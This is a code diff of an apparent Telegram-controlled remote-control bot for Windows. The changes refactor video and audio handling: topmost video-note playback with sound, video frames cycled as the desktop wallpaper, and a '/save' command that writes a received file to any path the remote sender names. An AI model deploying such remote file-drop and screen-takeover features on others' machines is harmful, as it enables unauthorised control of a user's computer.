@@ -26,7 +26,7 @@ from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, wai
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                  CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
-                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT)
+                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT, WINDOW_NORMAL, CAP_PROP_FPS, resizeWindow)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -39,7 +39,7 @@ try:
     from winsound import PlaySound, SND_FILENAME, SND_ASYNC
 except ImportError:
     PlaySound = lambda *args:args
-    SND_FILENAME = None
+    SND_ASYNC = SND_FILENAME = None
 
 #MISC
 import sys
@@ -997,8 +997,8 @@ class PeppinoTelegram:
         if volume:
             self.set_volume(old)
 
-    def __playsound(self, audio: str) -> None:
-        PlaySound(audio, SND_FILENAME | SND_ASYNC)
+    def __playsound(self, audio: str, separate_thread: bool = True) -> None:
+        PlaySound(audio, (SND_FILENAME|SND_ASYNC) if separate_thread else SND_FILENAME)
 
     def __send_image(self, image_name: str, caption=None) -> bool:
         try:
@@ -1291,7 +1291,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             elif content_type == "video":
                 self.parse_document(msg, mimetype="video")
             elif content_type in ("voice", "audio"):
-                self.parse_audio(msg)
+                Thread(target=self.parse_audio, args=(msg, )).start()
             elif content_type == "pinned_message":
                 self.delete_message(message_id)
             elif content_type == "video_note":
@@ -1722,9 +1722,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         response = requests.get(file_url)
         with open(filepath, "wb") as f:
             f.write(response.content) 
-        filepath = ogg_to_wav(filepath, rmold=True)
-        self.__playsound(filepath)
-        remove(filepath)
+        new_filepath = ogg_to_wav(filepath, rmold=True)
+        self.__playsound(new_filepath, False)
+        remove(new_filepath)
 
     def parse_command(self, text: str) -> None:
         args = text.split()
@@ -1834,7 +1834,82 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.mainmenu_ref.send_previous_page()
         else:
             self.bsend(f"Invalid command {command}")
+    
+    def parse_video_note(self, saved_filepath: str) -> None:
+        # VIDEOPART - Setup
+        cap = VideoCapture(saved_filepath)
+        fps = cap.get(CAP_PROP_FPS)
+        if fps <= 0:
+            fps = 30
+        frame_delay = int(1000 / fps)
 
+        namedWindow("Video", WINDOW_NORMAL)
+        setWindowProperty("Video", WND_PROP_TOPMOST, 1)
+
+        # AUDIOPART - Extract and play audio
+        temp_audio_file = join(BURN_DIRECTORY, f"{randomname()}.wav")
+        try:
+            video_clip = VideoFileClip(saved_filepath)
+            audio_clip = video_clip.audio
+            if audio_clip is not None:
+                audio_clip.write_audiofile(temp_audio_file, logger=None)
+                PlaySound(temp_audio_file, SND_FILENAME | SND_ASYNC)
+                audio_clip.close()
+            video_clip.close()
+        except:
+            pass
+
+        # VIDEOPART - PLaying the actual frames
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            resizeWindow("Video", frame.shape[1], frame.shape[0])
+            imshow("Video", frame)
+            waitKey(frame_delay)
+
+        cap.release()
+        destroyAllWindows()
+        
+        # Cleanup audio file
+        if exists(temp_audio_file):
+            sleep(2)
+            try:
+                remove(temp_audio_file)
+            except:
+                pass
+
+    def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
+        caption = msg["caption"].lower().strip()
+        if caption == "/setvideowallpaper":
+            if not self.confirmContuinuingWithoutWallpaperBackup():
+                return
+            duration = document["duration"]
+            video_stream = VideoCapture(saved_filepath)
+            res = True
+            start=time()
+            while res and (time()-start)<=duration:
+                res, frame = video_stream.read()
+                imwrite("tmp.png", frame)
+                change_wallpaper(abspath("tmp.png"))
+            remove("tmp.png")
+            self.restore_wallpaper()
+        
+        elif caption.startswith("/save"):
+            try:
+                args = caption.split()
+                if len(args)>1:
+                    filepath = " ".join(caption.split()[1:])
+                    containts_filename = "." in pathsplit(filepath)[-1]
+                    if containts_filename:
+                        rename(saved_filepath, filepath)
+                    else:
+                        rename(saved_filepath, join(filepath, saved_filename+".mp4"))
+                    self.bsend(f"{emoji_dict['file']} File saved successfully.")
+                    return
+            except Exception as e:
+                self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
+                return
 
     def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
         document = msg[mimetype]
@@ -1853,48 +1928,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 remove(saved_filepath)
 
         elif mimetype == "video":
-            caption = msg["caption"].lower().strip()
-            if caption == "/setvideowallpaper":
-                if not self.confirmContuinuingWithoutWallpaperBackup():
-                    return
-                duration = document["duration"]
-                video_stream = VideoCapture(saved_filepath)
-                res = True
-                start=time()
-                while res and (time()-start)<=duration:
-                    res, frame = video_stream.read()
-                    imwrite("tmp.png", frame)
-                    change_wallpaper(abspath("tmp.png"))
-                remove("tmp.png")
-                self.restore_wallpaper()
-            
-            elif caption.startswith("/save"):
-                try:
-                    args = caption.split()
-                    if len(args)>1:
-                        filepath = " ".join(caption.split()[1:])
-                        containts_filename = "." in pathsplit(filepath)[-1]
-                        if containts_filename:
-                            rename(saved_filepath, filepath)
-                        else:
-                            rename(saved_filepath, join(filepath, saved_filename+".mp4"))
-                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
-                        return
-                except Exception as e:
-                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
-                    return
+            self.parse_video(msg, document, saved_filepath, saved_filename)
 
         elif mimetype == "video_note":
-            cap = VideoCapture(saved_filepath)
-            while True:
-                ret, frame = cap.read()
-                if not ret:
-                    break
-                imshow("Video", frame)
-                waitKey(25)
-                setWindowProperty("Video", WINDOW_FULLSCREEN, 1)
-            cap.release()
-            destroyAllWindows()
+            print("VIDEO NOTE")
+            self.parse_video_note(saved_filepath)
+
 
     def parse_photo(self, msg: dict) -> None:
         filename = randompngname()
